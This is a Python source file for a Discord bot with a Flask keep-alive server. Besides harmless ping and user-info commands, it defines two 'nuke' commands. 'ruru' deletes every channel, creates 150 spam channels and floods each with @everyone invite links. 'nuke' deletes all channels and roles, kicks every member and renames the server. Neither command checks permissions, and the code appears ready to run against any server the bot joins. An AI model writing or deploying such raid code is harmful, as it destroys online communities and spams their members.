import os
import threading
from flask import Flask
import discord
from discord.ext import commands
import time
import asyncio
import random

# --- KeepAlive Server for Render & UptimeRobot ---
app = Flask(__name__)

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答"""
    return "Bot is running!"

def run_flask():
    """Flaskサーバーを別スレッドで起動する関数"""
    # Renderが設定する環境変数 'PORT' を使用する
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting Flask server on port {port}...")
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    """Webサーバーをメインのボット処理と並行して起動する"""
    t = threading.Thread(target=run_flask)
    t.start()
    print("Keep-alive server started.")

# --- Discord Bot Setup ---
# ⚠️ configファイルへの依存を排除し、プレフィックスを定義
prefix = "!"
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True
intents.message_content = True

# client を bot で統一します
bot = commands.Bot(command_prefix=prefix, intents=intents)

bot.remove_command("help")

@bot.event
async def on_ready():
    print("Ah shit, here we go again")
    print(f"Logged in as {bot.user}")

@bot.event
async def on_guild_join(guild):
    print("Joining {0}".format(guild.name))

#### SECRET COMMAND ####
@bot.command()
async def secret(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour=discord.Colour.blue()
    )
    # 動作確認用の仮応答
    await ctx.send(f"Secret command executed by {member.display_name}", delete_after=5)
    print("Action completed: Secret Message")

#### PING COMMAND ####
@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    # ⚠️ bot.latency (より正確) を使用
    latency_ms = round(bot.latency * 1000)

    # DM送信（元のロジックを維持）
    embed = discord.Embed(title="Pong!", description=f'Ping: {latency_ms}ms', color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: Server ping")

#### INFO COMMAND ####
@bot.command()
async def info(ctx, member: discord.Member = None):
    await ctx.message.delete()
    target_member = member or ctx.author

    response = (
        f"**The user's name is: {target_member.name}**"
        f"\n**The user's ID is: {target_member.id}**"
        f"\n**The user's current status is: {target_member.status}**"
        f"\n**The user's highest role is: {target_member.top_role}**"
        f"\n**The user joined at: {target_member.joined_at.strftime('%Y/%m/%d %H:%M:%S')}**"
    )

    # 応答をチャンネルに送信（元のロジックを維持）
    await ctx.send(response, delete_after=15)
    print("Action completed: User Info")

#### RURU COMMAND ####
@bot.command(name='ruru')
async def ruru(ctx):
    guild = ctx.guild
    await ctx.send('Nuking the server...')

    # 全てのチャンネルを削除
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)

    # 150個の「るるくん最強」チャンネルを最速で作成
    create_tasks = [guild.create_text_channel('るるくん最強') for _ in range(150)]
    new_channels = await asyncio.gather(*create_tasks)

    # 各チャンネルに@everyoneメンションを投稿
    mention_message = '@everyone 今すぐ参加⬇️ https://discord.gg/AdHwh9gMJe'
    mention_tasks = [channel.send(mention_message) for channel in new_channels for _ in range(15)]
    await asyncio.gather(*mention_tasks)

    await ctx.send('Server has been nuked and channels created!')

#### NUKE COMMAND ####
@bot.command(name='nuke')
async def nuke(ctx):
    guild = ctx.guild
    await ctx.send('Nuking the server...')

    # 全てのチャンネルを削除
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)

    # 全てのロールを削除
    role_delete_tasks = [role.delete() for role in guild.roles if role.name != '@everyone']
    await asyncio.gather(*role_delete_tasks)

    # 全てのメンバーをキック
    kick_tasks = [member.kick() for member in guild.members if member != ctx.author]
    await asyncio.gather(*kick_tasks)

    # サーバー名を変更
    await guild.edit(name='るるくんの勝ち')

    await ctx.send('Server has been nuked!')

# --- Main Execution ---
if __name__ == "__main__":
    # 環境変数からトークンを直接取得
    TOKEN = os.environ.get("DISCORD_TOKEN")

    if not TOKEN:
        print("エラー: 環境変数 'DISCORD_TOKEN' が設定されていません。")
    else:
        # 1. Keep-alive サーバーを起動
        keep_alive()

        # 2. Discord ボットを起動
        bot.run(TOKEN)


